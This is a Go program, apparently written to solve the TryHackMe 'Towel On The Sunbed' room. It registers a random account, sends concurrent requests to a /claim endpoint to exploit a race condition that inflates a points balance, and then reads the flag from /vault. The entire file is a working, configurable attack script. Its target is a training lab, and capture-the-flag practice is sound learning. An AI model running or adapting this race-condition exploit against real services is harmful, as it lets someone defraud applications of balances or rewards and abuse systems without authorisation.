package main

/*
author: thomas-osgood

description:

	program designed to solve the Towel On The Sunbed room
	on TryHackMe.

	this will exploit the race condition in the "claim" logic
	that is present on the site and reveal the flag.

	the same attack can also be performed via BurpSuite in the
	"Repeater" section by cloning a request to the "claim" endpoint
	and transmitting multiple request concurrently before contacting
	the "vault" endpoint.

args:

	- target: ip or domain of target
	- port: port to connect on
	- secure: use https
	- workers: number of workers used in race condition exploit
*/

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"net/http/cookiejar"
	"strings"
	"sync"
	"time"
)

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
const credsLen = 10
const minWorkers = 3

/*
JSON format of the payload that gets transmitted
to the auth/register endpoint for registration of
a new user account.
*/
type Creds struct {
	Password string `json:"password"`
	Username string `json:"username"`
}

/*
expected format of the JSON response from the
vault endpoint during a successful response.
*/
type Reward struct {
	Message string  `json:"message"`
	Flag    string  `json:"flag"`
	Balance float64 `json:"balance"`
}

type Exploiter struct {
	baseurl    string
	client     *http.Client
	maxWorkers int
}

type ExploiterOption struct {
	Baseurl    string
	Client     *http.Client
	MaxWorkers int
}

type ExploiterOptFunc func(*ExploiterOption) error

func NewExploiter(opts ...ExploiterOptFunc) (exploiter *Exploiter, err error) {
	var defaults ExploiterOption = ExploiterOption{MaxWorkers: minWorkers}
	var opt ExploiterOptFunc

	for _, opt = range opts {
		err = opt(&defaults)
		if err != nil {
			return nil, err
		}
	}

	if defaults.Client == nil {
		var jar http.CookieJar

		jar, err = cookiejar.New(nil)
		if err != nil {
			return nil, err
		}

		defaults.Client = &http.Client{
			Jar: jar,
		}
	}

	exploiter = new(Exploiter)
	exploiter.baseurl = defaults.Baseurl
	exploiter.client = defaults.Client
	exploiter.maxWorkers = defaults.MaxWorkers

	log.Printf("baseurl: %s\n", exploiter.baseurl)

	return exploiter, nil

}

/*
set the baseurl for the exploiter to use.

this strips all leading and trailing whitespace and "/"s.
*/
func WithBaseUrl(baseurl string) ExploiterOptFunc {
	return func(eo *ExploiterOption) error {
		baseurl = strings.Trim(baseurl, "/ ")

		if len(baseurl) < 1 {
			return fmt.Errorf("invalid baseurl passed in")
		}

		eo.Baseurl = baseurl
		return nil
	}
}

/*
set the HTTP client for the exploiter to use.
*/
func WithClient(client *http.Client) ExploiterOptFunc {
	return func(eo *ExploiterOption) error {
		if client.Jar == nil {
			return fmt.Errorf("the client must contain a cookiejar or the attack will fail")
		}

		eo.Client = client
		return nil
	}
}

/*
set the number of workers that will hit the claim endpoint
to exploit the race condition.
*/
func WithMaxWorkers(count int) ExploiterOptFunc {
	return func(eo *ExploiterOption) error {
		if count < minWorkers {
			return fmt.Errorf("must have at least %d workers for the attack to be successful", minWorkers)
		}

		eo.MaxWorkers = count
		return nil
	}
}

/*
register the username and password with the server.

this will also set the cookie in the cookie jar that
will be used to POST to the claims endpoint and GET
from the vault endpoint.
*/
func (e *Exploiter) register() (creds Creds, err error) {
	var cancel context.CancelFunc
	var ctx context.Context
	var fullurl string = fmt.Sprintf("%s/auth/register", e.baseurl)
	var jsonData []byte
	var req *http.Request
	var resp *http.Response

	ctx, cancel = context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	creds.Password, err = GenerateSecureString(credsLen)
	if err != nil {
		return creds, err
	}

	creds.Username, err = GenerateSecureString(credsLen)
	if err != nil {
		return creds, err
	}

	jsonData, err = json.Marshal(&creds)
	if err != nil {
		return creds, err
	}

	req, err = http.NewRequestWithContext(ctx, http.MethodPost, fullurl, bytes.NewReader(jsonData))
	if err != nil {
		return creds, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")

	resp, err = e.client.Do(req)
	if err != nil {
		return creds, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusCreated {
		return creds, fmt.Errorf("unable to register user: %s", resp.Status)
	}

	return creds, nil
}

/*
hit the claim endpoint.

this is designed to be part of a go routine because there is a race
condition present in the process that allows the user to make multiple
successful requests to the claim endpoint concurrently, enabling the user
to acquire more points than desired.
*/
func (e *Exploiter) claim(wg *sync.WaitGroup) (err error) {
	defer wg.Done()

	var cancel context.CancelFunc
	var ctx context.Context
	var fullurl string = fmt.Sprintf("%s/claim", e.baseurl)
	var req *http.Request
	var resp *http.Response

	ctx, cancel = context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	req, err = http.NewRequestWithContext(ctx, http.MethodPost, fullurl, nil)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")

	resp, err = e.client.Do(req)
	if err != nil {
		return err
	}

	if resp.StatusCode >= http.StatusBadRequest {
		fmt.Printf("bad status: %s\n", resp.Status)
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	return nil
}

/*
hit the vault endpoint and acquire the flag.

this can only be done successfully after the user has acquired
enough points to reach the "Whale" level.
*/
func (e *Exploiter) vault() (reward Reward, err error) {

	var cancel context.CancelFunc
	var ctx context.Context
	var fullurl string = fmt.Sprintf("%s/vault", e.baseurl)
	var req *http.Request
	var resp *http.Response

	ctx, cancel = context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	req, err = http.NewRequestWithContext(ctx, http.MethodGet, fullurl, nil)
	if err != nil {
		return reward, err
	}
	req.Header.Set("Accept", "application/json")

	resp, err = e.client.Do(req)
	if err != nil {
		return reward, err
	}

	if resp.StatusCode >= http.StatusBadRequest {
		fmt.Printf("bad status: %s\n", resp.Status)
		return reward, fmt.Errorf("bad status: %s", resp.Status)
	}

	err = json.NewDecoder(resp.Body).Decode(&reward)
	if err != nil {
		return reward, err
	}

	return reward, nil
}

/*
carry out the attack on the target. this will register a random
user, exploit the race condition present in the claim endpoint and
pull down the flag from the vault endpoint.
*/
func (e *Exploiter) Attack() (err error) {
	var creds Creds
	var i int
	var wg sync.WaitGroup
	var reward Reward

	/*
		step 1: register a random user with the system

		a new user will be created each time this is called and
		the credentials will be displayed.
	*/
	creds, err = e.register()
	if err != nil {
		return err
	}

	fmt.Printf("Creds: \"%s:%s\"\n", creds.Username, creds.Password)

	/*
		step 2: exploit the race condition

		hit the /claim endpoint with multiple concurrent requests
		to receive more points and move up to the "whale" tier.
	*/
	for i = 0; i < e.maxWorkers; i++ {
		wg.Add(1)
		go e.claim(&wg)
	}
	wg.Wait()

	/*
		step 3: retrieve the flag

		hit the /vault endpoint after the point threshold has been
		reached and acquire the flag.
	*/
	reward, err = e.vault()
	if err != nil {
		return err
	}

	log.Printf("Flag: %s\n", reward.Flag)

	return nil
}

/*
securely generate a random string of length "length" that
contains only characters in the set defined in the "charset"
const above ([a-zA-Z0-09]).
*/
func GenerateSecureString(length int) (string, error) {
	var sb strings.Builder
	sb.Grow(length)

	// Create a byte buffer to read random data into
	bytes := make([]byte, length)
	if _, err := rand.Read(bytes); err != nil {
		return "", err
	}

	for _, b := range bytes {
		// Map each random byte to our character set
		sb.WriteByte(charset[int(b)%len(charset)])
	}

	return sb.String(), nil
}

func init() {}

func main() {
	var attacker *Exploiter
	var err error

	var ip string
	var port uint
	var scheme string = "http"
	var secure bool

	var workers int

	flag.StringVar(&ip, "target", "", "ip or domain of target")
	flag.UintVar(&port, "port", 3000, "port to connect on")
	flag.BoolVar(&secure, "secure", false, "use https")
	flag.IntVar(&workers, "workers", minWorkers, "number of workers used in race condition exploit")
	flag.Parse()

	if secure {
		scheme = "https"
	}

	var baseurl string = fmt.Sprintf("%s://%s:%d", scheme, ip, port)

	attacker, err = NewExploiter(WithBaseUrl(baseurl), WithMaxWorkers(workers))
	if err != nil {
		log.Fatalf("error creating attacker: %s\n", err.Error())
	}

	err = attacker.Attack()
	if err != nil {
		log.Fatalf("error attacking: %s\n", err.Error())
	}
}
